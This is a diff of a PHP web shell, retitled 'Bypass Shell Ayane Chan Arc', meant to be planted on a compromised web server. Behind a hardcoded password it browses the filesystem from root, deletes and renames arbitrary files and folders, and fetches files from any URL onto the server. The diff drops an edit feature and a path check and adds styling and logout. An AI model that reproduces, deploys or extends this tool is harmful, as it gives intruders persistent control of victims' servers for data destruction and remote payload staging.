@@ -1,16 +1,38 @@
 <?php
 session_start();
 
-$password = 'ayane111'; 
-$isAuthenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+define('PASSWORD', 'ayane111'); // Password for access control
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
-    if ($_POST['password'] === $password) {
+if (isset($_POST['password'])) {
+    if ($_POST['password'] === PASSWORD) {
         $_SESSION['authenticated'] = true;
-        $isAuthenticated = true;
     } else {
         echo "<div class='alert alert-danger'>Incorrect password.</div>";
     }
+}
+
+if (isset($_POST['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+    echo '
+    <div class="container mt-5">
+        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
+        <div class="text-center mb-4">
+            <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
+        </div>
+        <form method="post" class="text-center">
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Login</button>
+        </form>
+    </div>';
+    exit;
 }
 
 function uploadFromUrl($url, $saveTo) {
@@ -40,23 +62,26 @@ function display_path_links($dir) {
 
         foreach ($folders as $folder) {
             $folderPath = htmlspecialchars($dir . '/' . $folder);
-            echo "<a href='?dir=" . urlencode($folderPath) . "' class='list-group-item list-group-item-action'>$folder/</a>";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
+            echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
+            echo "<form method='post' style='display:inline;'>";
+            echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $folder) . "'>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "</form>";
+            echo "</div>";
         }
 
         foreach ($files as $file) {
             echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
             echo "<span>$file</span>";
             echo "<form method='post' style='display:inline;'>";
-            echo "<input type='hidden' name='edit' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<button type='submit' class='btn btn-primary btn-sm ml-2'>Edit</button>";
+            echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
+            echo "<input type='text' name='destination' class='form-control-sm' placeholder='New name'>";
+            echo "<button type='submit' name='rename' class='btn btn-warning btn-sm ml-2'>Rename</button>";
             echo "</form>";
             echo "<form method='post' style='display:inline;'>";
-            echo "<input type='hidden' name='delete' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<button type='submit' class='btn btn-danger btn-sm ml-2'>Delete</button>";
-            echo "</form>";
-            echo "<form method='post' style='display:inline;'>";
-            echo "<input type='hidden' name='rename' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' onclick=\"document.getElementById('rename-form').style.display='block'\">Rename</button>";
+            echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
             echo "</form>";
             echo "</div>";
         }
@@ -65,24 +90,17 @@ function display_path_links($dir) {
     }
 }
 
-function editFile($filePath, $newContent) {
-    if (file_put_contents($filePath, $newContent) !== false) {
-        echo "<div class='alert alert-success'>File edited successfully.</div>";
+function deleteItem($path) {
+    if (is_dir($path)) {
+        rmdir($path);
     } else {
-        echo "<div class='alert alert-danger'>Failed to edit file.</div>";
+        unlink($path);
     }
+    echo "<div class='alert alert-success'>Item deleted successfully.</div>";
 }
 
-function deleteFile($filePath) {
-    if (unlink($filePath)) {
-        echo "<div class='alert alert-success'>File deleted successfully.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Failed to delete file.</div>";
-    }
-}
-
-function renameFile($oldPath, $newPath) {
-    if (rename($oldPath, $newPath)) {
+function renameFile($source, $destination) {
+    if (rename($source, $destination)) {
         echo "<div class='alert alert-success'>File renamed successfully.</div>";
     } else {
         echo "<div class='alert alert-danger'>Failed to rename file.</div>";
@@ -98,30 +116,19 @@ if (isset($_POST['url']) && isset($_POST['dir'])) {
     uploadFromUrl($url, $savePath);
 }
 
-if (isset($_POST['edit']) && isset($_POST['content'])) {
-    $file = $_POST['edit'];
-    $content = $_POST['content'];
-    editFile($file, $content);
+if (isset($_POST['delete']) && isset($_POST['path'])) {
+    $path = $_POST['path'];
+    deleteItem($path);
 }
 
-if (isset($_POST['delete'])) {
-    $file = $_POST['delete'];
-    deleteFile($file);
-}
-
-if (isset($_POST['rename']) && isset($_POST['newName'])) {
-    $oldPath = $_POST['rename'];
-    $newName = $_POST['newName'];
-    $newPath = dirname($oldPath) . '/' . $newName;
-    renameFile($oldPath, $newPath);
+if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
+    $source = $_POST['source'];
+    $destination = $_POST['destination'];
+    renameFile($source, $destination);
 }
 
 $dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $displayDir = realpath($dir);
-
-if ($displayDir === false) {
-    die('Invalid directory.');
-}
 
 $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
 ?>
@@ -131,57 +138,91 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webshell by Ayane Chan Arc</title>
+    <title>Bypass Shell Ayane Chan Arc</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f0f8ff;
+        }
+        .container {
+            background-color: #fff0f5;
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .btn-link {
+            color: #ff69b4;
+        }
+        .btn-primary {
+            background-color: #87ceeb;
+            border-color: #87ceeb;
+        }
+        .btn-danger {
+            background-color: #ff4500;
+            border-color: #ff4500;
+        }
+        .btn-warning {
+            background-color: #ffd700;
+            border-color: #ffd700;
+        }
+        footer {
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
     <div class="container mt-5">
-        <?php if (!$isAuthenticated): ?>
-            <form method="post">
-                <div class="form-group">
-                    <label for="password">Enter Password</label>
-                    <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
-                </div>
-                <button type="submit" class="btn btn-primary">Submit</button>
-            </form>
+        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
+        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
+        <div class="text-center mb-4">
+            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
+        </div>
+        <form method="post" class="text-center">
+            <button type="submit" name="logout" class="btn btn-danger">Logout</button>
+        </form>
+
+        <h2 class="mt-4">Upload File to Current Directory</h2>
+        <form method="post">
+            <div class="form-group">
+                <label for="url">File URL</label>
+                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+            </div>
+            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
+            <button type="submit" class="btn btn-primary">Upload from URL</button>
+        </form>
+
+        <h2 class="mt-4">Directory Listing</h2>
+        <div class="alert alert-info">
+            <strong>Current Directory:</strong> 
+            <?php
+            $currentPath = '/';
+            echo "<a href='?dir=' class='btn btn-link'>/</a> ";
+            foreach ($dirArray as $index => $folder) {
+                $currentPath .= htmlspecialchars($folder) . '/';
+                $encodedPath = urlencode($currentPath);
+                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
+                if ($index < count($dirArray) - 1) {
+                    echo " / ";
+                }
+            }
+            ?>
+        </div>
+        <div class="list-group">
+            <?php
+            display_path_links($dir);
+            ?>
+        </div>
+
+        <footer class="text-center mt-4">
+            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. All rights reserved.</small>
+        </footer>
         <?php else: ?>
-            <h1 class="mb-4">Webshell by Ayane Chan Arc</h1>
-            <div class="mb-4">
-                <nav aria-label="breadcrumb">
-                    <ol class="breadcrumb">
-                        <li class="breadcrumb-item"><a href="?dir=/"><?php echo htmlspecialchars('/'); ?></a></li>
-                        <?php foreach ($dirArray as $key => $dirPart): ?>
-                            <?php $path = '/' . implode(DIRECTORY_SEPARATOR, array_slice($dirArray, 0, $key + 1)); ?>
-                            <li class="breadcrumb-item">
-                                <a href="?dir=<?php echo urlencode($path); ?>"><?php echo htmlspecialchars($dirPart); ?></a>
-                            </li>
-                        <?php endforeach; ?>
-                    </ol>
-                </nav>
-            </div>
-            <?php display_path_links($displayDir); ?>
-            <form method="post" class="mt-4">
-                <div class="form-group">
-                    <label for="url">File URL</label>
-                    <input type="text" id="url" name="url" class="form-control" placeholder="URL" required>
-                </div>
-                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($displayDir); ?>">
-                <button type="submit" class="btn btn-primary">Upload from URL</button>
-            </form>
-            <div id="rename-form" style="display:none;">
-                <form method="post" class="mt-4">
-                    <div class="form-group">
-                        <label for="newName">New Name</label>
-                        <input type="text" id="newName" name="newName" class="form-control" placeholder="New name" required>
-                    </div>
-                    <input type="hidden" name="rename" value="<?php echo htmlspecialchars($displayDir); ?>">
-                    <button type="submit" class="btn btn-secondary">Rename</button>
-                </form>
-            </div>
+        <!-- Login page content here if not authenticated -->
         <?php endif; ?>
     </div>
+
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
 </html>
+
